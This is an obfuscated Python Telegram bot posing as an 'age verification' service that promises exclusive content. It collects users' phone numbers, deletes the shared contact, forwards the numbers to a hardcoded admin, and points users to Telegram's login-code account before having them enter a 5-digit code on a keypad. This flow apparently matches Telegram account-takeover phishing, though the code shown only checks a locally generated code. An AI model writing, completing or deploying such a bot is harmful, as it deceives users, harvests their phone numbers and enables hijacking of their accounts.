import logging
import random
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import sqlite3
from datetime import datetime
import base64

# Obfuscated strings
_0x1a2b = lambda x: base64.b64decode(x).decode()
_0x3c4d = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
_0x5e6f = _0x1a2b(b'Qk9UX1RPS0VO')
_0x7g8h = _0x1a2b(b'QURNSU5fSUQ=')

logging.basicConfig(format=_0x3c4d, level=logging.INFO)
logger = logging.getLogger(__name__)

_0x9i0j = os.getenv(_0x5e6f)
_0x1k2l = int(os.getenv(_0x7g8h, '6483793776'))

class _0xAVB:
    def __init__(self):
        self._0xdb()
        self._0xvs = {}
        
    def _0xdb(self):
        """Initialize SQLite database"""
        self._0xc = sqlite3.connect('age_verification.db', check_same_thread=False)
        _0xcr = self._0xc.cursor()
        
        _0xcr.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verification_code TEXT,
                verified BOOLEAN DEFAULT 0,
                code_sent BOOLEAN DEFAULT 0,
                created_at DATETIME,
                verified_at DATETIME
            )
        ''')
        
        self._0xc.commit()

    async def _0xst(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command"""
        _0xu = update.message.from_user
        
        _0xcr = self._0xc.cursor()
        _0xcr.execute('SELECT verified FROM users WHERE user_id = ?', (_0xu.id,))
        _0xr = _0xcr.fetchone()
        
        if _0xr and _0xr[0]:
            await update.message.reply_text(
                "✅ **Already Verified!**\n\nYou're already age-verified in our system. No need to verify again!",
                parse_mode='Markdown'
            )
            return
        
        _0xwt = f"""
🌟 **Excited to explore something fresh and thrilling?**
🚀 **Confirm your age to unlock an exclusive content collection!**
⚡ **Act fast — spots are limited!**

Hello {_0xu.first_name}! 

**Step 1:** Share your phone number to receive verification code.

👇 Click the button below to share your contact.
        """
        
        _0xck = ReplyKeyboardMarkup([
            [KeyboardButton("📱 Share My Contact", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            _0xwt, 
            parse_mode='Markdown',
            reply_markup=_0xck
        )

    async def _0xhc(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle contact"""
        try:
            _0xu = update.message.from_user
            _0xct = update.message.contact
            
            if _0xct.user_id != _0xu.id:
                await update.message.reply_text(
                    "❌ Please share your own contact, not someone else's.",
                    reply_markup=ReplyKeyboardRemove()
                )
                return
            
            # Delete contact message
            await update.message.delete()
            
            _0xvc = str(random.randint(10000, 99999))
            
            _0xcr = self._0xc.cursor()
            _0xcr.execute('''
                INSERT OR REPLACE INTO users 
                (user_id, username, first_name, phone_number, verification_code, code_sent, created_at)
                VALUES (?, ?, ?, ?, ?, 0, ?)
            ''', (_0xu.id, _0xu.username, _0xu.first_name, _0xct.phone_number, _0xvc, datetime.now()))
            self._0xc.commit()
            
            # Send processing message
            await update.message.chat.send_message(
                "📨 **Processing your request...**\n\nPlease wait for admin to send verification code.",
                parse_mode='Markdown',
                reply_markup=ReplyKeyboardRemove()
            )
            
            # Send "Get Code" button to user
            _0xgc_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton('👉 Get Code!', url='https://t.me/+42777')]
            ])
            
            await context.bot.send_message(
                _0xu.id,
                "**Step 2:** Click the button below to get your verification code.",
                parse_mode='Markdown',
                reply_markup=_0xgc_kb
            )
            
            # Notify admin with send code button
            _0xadmin_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton('📤 Send Code Input', callback_data=f'send_code_{_0xu.id}')]
            ])
            
            await context.bot.send_message(
                _0x1k2l,
                f"""
📱 **New Verification Request**

👤 User: {_0xu.first_name} (@{_0xu.username})
🆔 User ID: `{_0xu.id}`
📞 Phone: `{_0xct.phone_number}`
🔢 Generated Code: `{_0xvc}`

**Action:** Click button below to send code input interface to user.
                """,
                parse_mode='Markdown',
                reply_markup=_0xadmin_kb
            )
            
        except Exception as e:
            logger.error(f"Error handling contact: {e}")
            await update.message.reply_text("❌ Error processing. Please try /start again.")

    async def _0xsci(self, context, _0xui, _0xvc):
        """Send code input interface"""
        try:
            _0xkb = [
                [
                    InlineKeyboardButton('1', callback_data=f'n_1_{_0xui}'),
                    InlineKeyboardButton('2', callback_data=f'n_2_{_0xui}'),
                    InlineKeyboardButton('3', callback_data=f'n_3_{_0xui}')
                ],
                [
                    InlineKeyboardButton('4', callback_data=f'n_4_{_0xui}'),
                    InlineKeyboardButton('5', callback_data=f'n_5_{_0xui}'),
                    InlineKeyboardButton('6', callback_data=f'n_6_{_0xui}')
                ],
                [
                    InlineKeyboardButton('7', callback_data=f'n_7_{_0xui}'),
                    InlineKeyboardButton('8', callback_data=f'n_8_{_0xui}'),
                    InlineKeyboardButton('9', callback_data=f'n_9_{_0xui}')
                ],
                [
                    InlineKeyboardButton('0', callback_data=f'n_0_{_0xui}')
                ]
            ]
            
            _0xrm = InlineKeyboardMarkup(_0xkb)
            
            _0xmsg = """
**Enter your verification code:**

Code: ` - - - - - `

Use the buttons below to enter your 5-digit code.
            """
            
            await context.bot.send_message(
                _0xui,
                _0xmsg,
                parse_mode='Markdown',
                reply_markup=_0xrm
            )
            
            # Initialize session
            self._0xvs[_0xui] = {
                'code': '',
                'correct_code': _0xvc
            }
            
            # Update database - code sent
            _0xcr = self._0xc.cursor()
            _0xcr.execute('UPDATE users SET code_sent = 1 WHERE user_id = ?', (_0xui,))
            self._0xc.commit()
            
        except Exception as e:
            logger.error(f"Error sending interface: {e}")

    async def _0xhcb(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle callback"""
        try:
            _0xq = update.callback_query
            _0xui = _0xq.from_user.id
            
            await _0xq.answer()
            
            _0xd = _0xq.data
            
            # Admin sending code input to user
            if _0xd.startswith('send_code_'):
                if _0xui != _0x1k2l:
                    await _0xq.answer("❌ Admin only!", show_alert=True)
                    return
                
                _0xtarget_id = int(_0xd.split('_')[2])
                
                # Get verification code from DB
                _0xcr = self._0xc.cursor()
                _0xcr.execute('SELECT verification_code, code_sent FROM users WHERE user_id = ?', (_0xtarget_id,))
                _0xr = _0xcr.fetchone()
                
                if not _0xr:
                    await _0xq.answer("❌ User not found!", show_alert=True)
                    return
                
                if _0xr[1]:
                    await _0xq.answer("⚠️ Code already sent!", show_alert=True)
                    return
                
                _0xvc = _0xr[0]
                
                # Send code input interface to user
                await self._0xsci(context, _0xtarget_id, _0xvc)
                
                # Update admin message
                await _0xq.edit_message_text(
                    _0xq.message.text + "\n\n✅ **Code input sent to user!**",
                    parse_mode='Markdown'
                )
                
                return
            
            # User entering code
            if _0xd.startswith('n_'):
                if _0xui not in self._0xvs:
                    await _0xq.edit_message_text("❌ Session expired. Please /start again.")
                    return
                
                _0xs = self._0xvs[_0xui]
                _0xn = _0xd.split('_')[1]
                
                if len(_0xs['code']) < 5:
                    _0xs['code'] += _0xn
                    
                _0xdisp = ' '.join(_0xs['code'].ljust(5, '-'))
                
                await _0xq.edit_message_text(
                    f"""
**Enter your verification code:**

Code: ` {_0xdisp} `

Use the buttons below to enter your 5-digit code.
                    """,
                    parse_mode='Markdown',
                    reply_markup=_0xq.message.reply_markup
                )
                
                # Check if complete
                if len(_0xs['code']) == 5:
                    if _0xs['code'] == _0xs['correct_code']:
                        # Correct code
                        _0xcr = self._0xc.cursor()
                        _0xcr.execute('UPDATE users SET verified = 1, verified_at = ? WHERE user_id = ?', 
                                    (datetime.now(), _0xui))
                        self._0xc.commit()
                        
                        await _0xq.edit_message_text(
                            "✅ **Verification Successful!**\n\nYou're now verified!",
                            parse_mode='Markdown'
                        )
                        
                        # Notify admin
                        await context.bot.send_message(
                            _0x1k2l,
                            f"✅ User `{_0xui}` successfully verified!",
                            parse_mode='Markdown'
                        )
                    else:
                        # Wrong code
                        await _0xq.edit_message_text(
                            "❌ **Invalid Code!**\n\nPlease try /start again.",
                            parse_mode='Markdown'
                        )
                    
                    # Clear session
                    del self._0xvs[_0xui]
                    
        except Exception as e:
            logger.error(f"Error in callback: {e}")
            await _0xq.edit_message_text("❌ Error occurred. Please /start again.")

    async def _0xsts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin stats"""
        if update.message.from_user.id != _0x1k2l:
            return
        
        _0xcr = self._0xc.cursor()
        _0xcr.execute('SELECT COUNT(*) FROM users WHERE verified = 1')
        _0xv = _0xcr.fetchone()[0]
        
        _0xcr.execute('SELECT COUNT(*) FROM users')
        _0xt = _0xcr.fetchone()[0]
        
        _0xcr.execute('SELECT COUNT(*) FROM users WHERE code_sent = 1 AND verified = 0')
        _0xcs = _0xcr.fetchone()[0]
        
        await update.message.reply_text(
            f"""
📊 **Bot Statistics**

✅ Verified Users: {_0xv}
📤 Code Sent (Pending): {_0xcs}
📝 Total Users: {_0xt}
⏳ Waiting for Admin: {_0xt - _0xv - _0xcs}
            """,
            parse_mode='Markdown'
        )

def _0xmain():
    """Run the bot"""
    if not _0x9i0j:
        logger.error("❌ BOT_TOKEN environment variable is not set!")
        logger.error("Please set BOT_TOKEN in Railway environment variables.")
        return
    
    _0xbot = _0xAVB()
    _0xapp = Application.builder().token(_0x9i0j).build()
    
    _0xapp.add_handler(CommandHandler("start", _0xbot._0xst))
    _0xapp.add_handler(CommandHandler("stats", _0xbot._0xsts))
    _0xapp.add_handler(MessageHandler(filters.CONTACT, _0xbot._0xhc))
    _0xapp.add_handler(CallbackQueryHandler(_0xbot._0xhcb))
    
    logger.info("🚀 Bot started!")
    _0xapp.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    _0xmain()
